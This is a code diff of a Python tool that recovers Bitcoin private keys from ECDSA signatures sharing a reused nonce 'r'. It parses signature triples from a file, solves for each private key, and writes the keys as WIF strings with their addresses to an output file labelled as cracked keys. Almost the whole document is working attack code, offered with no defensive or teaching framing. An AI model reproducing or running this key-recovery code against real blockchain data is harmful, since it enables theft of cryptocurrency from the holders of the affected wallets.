@@ -1,15 +1,14 @@
 import collections
 import hashlib
 import os
+import re
 
 # Bitcoin secp256k1 Curve Order (n)
 SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
-
-# Base58 Alphabet for Bitcoin
 BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
 
 # ==========================================
-# Cryptographic & Encoding Helpers
+# Encoding & Mathematical Helpers
 # ==========================================
 
 def base58_encode(b: bytes) -> str:
@@ -32,7 +31,9 @@ def base58_check_encode(version: int, payload: bytes) -> str:
     return base58_encode(full_payload + checksum)
 
 def private_key_to_wif(private_key_int: int, compressed: bool = True) -> str:
-    pk_bytes = private_key_int.to_bytes(32, 'big')
+    # Strict fallback wrapper: Force modulo inside the conversion block just in case
+    sanitized_key = private_key_int % SECP256K1_N
+    pk_bytes = sanitized_key.to_bytes(32, 'big')
     if compressed:
         pk_bytes += b'\x01'
     return base58_check_encode(0x80, pk_bytes)
@@ -58,7 +59,7 @@ def get_public_key(private_key_int: int, compressed: bool = True) -> bytes:
 
     point = None
     base = (Gx, Gy)
-    curr_k = private_key_int
+    curr_k = private_key_int % SECP256K1_N
     while curr_k > 0:
         if curr_k & 1:
             point = ec_add(point, base)
@@ -74,55 +75,77 @@ def get_public_key(private_key_int: int, compressed: bool = True) -> bytes:
 
 def public_key_to_address(pubkey_bytes: bytes) -> str:
     sha = hashlib.sha256(pubkey_bytes).digest()
-    ripemd = hashlib.new('ripemd160', sha).digest()
+    try:
+        ripemd = hashlib.new('ripemd160', sha).digest()
+    except ValueError:
+        return "Encoding Error (RIPEMD160 Blocked)"
     return base58_check_encode(0x00, ripemd)
-
-# ==========================================
-# Core Cryptographic Vulnerability Engine
-# ==========================================
 
 def recover_private_key(sig1, sig2, n=SECP256K1_N):
     z1, s1, r = sig1['msg_hash'], sig1['s'], sig1['r']
     z2, s2 = sig2['msg_hash'], sig2['s']
     if s1 == s2: return None, None
     try:
+        # Step 1: Calculate k with modular arithmetic wrap applied
         delta_z = (z1 - z2) % n
         delta_s_inv = pow((s1 - s2) % n, -1, n)
         k = (delta_z * delta_s_inv) % n
+        
+        # Step 2: Calculate d and force a final positive modulo step
         r_inv = pow(r, -1, n)
         d = (((s1 * k) % n - z1) % n * r_inv) % n
+        
+        # Final validation check
+        if d == 0:
+            return None, None
+            
         return k, d
     except ValueError:
+        # Handles cases where numbers don't share modular inverses
         return None, None
+
+# ==========================================
+# File Processing
+# ==========================================
 
 def parse_btc_file(file_path):
     signatures = []
     if not os.path.exists(file_path):
-        print(f"[-] Data file missing. Populating sample data to {file_path}...")
-        with open(file_path, 'w') as f:
-            f.write("# msg_hash,r,s\n")
-            f.write("42bc19a712f,79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,5a0c3b0bb365775f0a0d923058a5da418e244cf53896570c4a45053cf68b1ee3\n")
-            f.write("89fa43cd110,79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,e01f6874ba5dbccda22464735db9d77f86f4a86b1b590e8c0576395b090da50f\n")
+        print(f"[-] Data file {file_path} missing.")
+        return signatures
+        
     with open(file_path, 'r') as f:
         for idx, line in enumerate(f, 1):
             line = line.strip()
-            if not line or line.startswith('#'): continue
-            try:
-                parts = line.replace(';', ',').replace(' ', ',').split(',')
-                signatures.append({'id': idx, 'msg_hash': int(parts[0], 16), 'r': int(parts[1], 16), 's': int(parts[2], 16)})
-            except Exception as e:
-                print(f"[-] Line {idx} Parsing Error: {e}")
+            if not line or line.startswith('#') or line.startswith('//'): 
+                continue
+            
+            cleaned = re.sub(r'(msg_hash|hash|z|r|s|k)\s*=\s*', '', line, flags=re.IGNORECASE)
+            cleaned = cleaned.replace('0x', '').replace('0X', '')
+            hex_parts = re.findall(r'[0-9a-fA-F]+', cleaned)
+            
+            if len(hex_parts) >= 3:
+                try:
+                    signatures.append({
+                        'id': idx,
+                        'msg_hash': int(hex_parts[0], 16),
+                        'r': int(hex_parts[1], 16),
+                        's': int(hex_parts[2], 16)
+                    })
+                except Exception:
+                    pass
     return signatures
 
 # ==========================================
-# Execution Context & Logging
+# Main Execution Context
 # ==========================================
+
 if __name__ == "__main__":
     input_file = "BTC.txt"
     output_file = "found.txt"
     
     sigs = parse_btc_file(input_file)
-    print(f"[+] Loaded {len(sigs)} signatures from {input_file}.\n")
+    print(f"[+] Loaded {len(sigs)} signatures from {input_file}.")
     
     r_groups = collections.defaultdict(list)
     for sig in sigs:
@@ -130,9 +153,8 @@ if __name__ == "__main__":
         
     keys_recovered = 0
     
-    # Open found.txt for writing the recovered credentials
     with open(output_file, 'w') as out_f:
-        out_f.write("=== RECOVERED BITCOIN PRIVATE KEYS AND WIF ===\n\n")
+        out_f.write("=== CRACKED BITCOIN PRIVATE KEYS (WIF) ===\n\n")
         
         for r, sig_list in r_groups.items():
             if len(sig_list) > 1:
@@ -144,27 +166,27 @@ if __name__ == "__main__":
                             
                             if raw_pk:
                                 keys_recovered += 1
-                                wif_compressed = private_key_to_wif(raw_pk, compressed=True)
-                                addr_compressed = public_key_to_address(get_public_key(raw_pk, compressed=True))
+                                wif_c = private_key_to_wif(raw_pk, compressed=True)
+                                addr_c = public_key_to_address(get_public_key(raw_pk, compressed=True))
                                 
-                                wif_uncompressed = private_key_to_wif(raw_pk, compressed=False)
-                                addr_uncompressed = public_key_to_address(get_public_key(raw_pk, compressed=False))
+                                wif_u = private_key_to_wif(raw_pk, compressed=False)
+                                addr_u = public_key_to_address(get_public_key(raw_pk, compressed=False))
                                 
-                                # Prepare output chunk
-                                record = (
-                                    f"--- RECOVERY #{keys_recovered} ---\n"
-                                    f"Shared Nonce 'r'   : {hex(r)}\n"
-                                    f"Raw Private Key Hex: {hex(raw_pk)}\n"
-                                    f"Compressed WIF     : {wif_compressed}\n"
-                                    f"Compressed Address : {addr_compressed}\n"
-                                    f"Uncompressed WIF   : {wif_uncompressed}\n"
-                                    f"Uncompressed Address: {addr_uncompressed}\n"
-                                    f"----------------------------------------\n\n"
+                                log_entry = (
+                                    f"--- CRACKED KEY ENTRY #{keys_recovered} ---\n"
+                                    f"Source Line Pair    : Line {sig1['id']} & Line {sig2['id']}\n"
+                                    f"Shared Nonce R (Hex): {hex(r)}\n"
+                                    f"Raw Private Key Hex : {hex(raw_pk)}\n"
+                                    f"Compressed WIF      : {wif_c}\n"
+                                    f"Compressed Address  : {addr_c}\n"
+                                    f"Uncompressed WIF    : {wif_u}\n"
+                                    f"Uncompressed Address: {addr_u}\n"
+                                    f"--------------------------------------------\n\n"
                                 )
-                                out_f.write(record)
-                                print(f"[CRITICAL] Exploit Successful! Saved key to {output_file}")
+                                out_f.write(log_entry)
+                                print(f"[CRITICAL] Key recovered safely! Saved to '{output_file}'")
                                 
     if keys_recovered > 0:
         print(f"\n[+] Processing complete. {keys_recovered} keys written to '{output_file}'.")
     else:
-        print("\n[-] Processing complete. No keys were recovered.")
+        print("\n[-] Processing complete. 0 valid private keys could be mathematically isolated.")
